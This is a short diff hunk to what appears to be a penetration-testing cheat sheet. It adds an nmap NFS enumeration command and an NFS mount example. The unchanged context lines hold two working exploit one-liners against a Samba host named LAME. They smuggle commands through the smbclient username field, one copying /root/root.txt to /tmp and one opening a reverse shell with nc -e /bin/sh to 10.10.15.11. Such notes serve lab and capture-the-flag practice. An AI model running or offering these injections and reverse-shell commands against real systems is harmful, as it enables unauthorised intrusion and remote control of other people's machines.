@@ -36,6 +36,9 @@ https://github.com/absolomb/Pentesting/blob/master/guides/Initial%20Enumeration.
   smbclient -U "/=\`nohup cat /root/root.txt > /tmp/ttt\`" -N -I ip //LAME/tmp
 
   smbclient -U "/=\`nohup nc -e /bin/sh 10.10.15.11 60000\`" -N -I ip //LAME/tmp
+  
+nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.100.49
+
 
 mount
   mount ip:/vol/share /mnt/nfs  -nolock
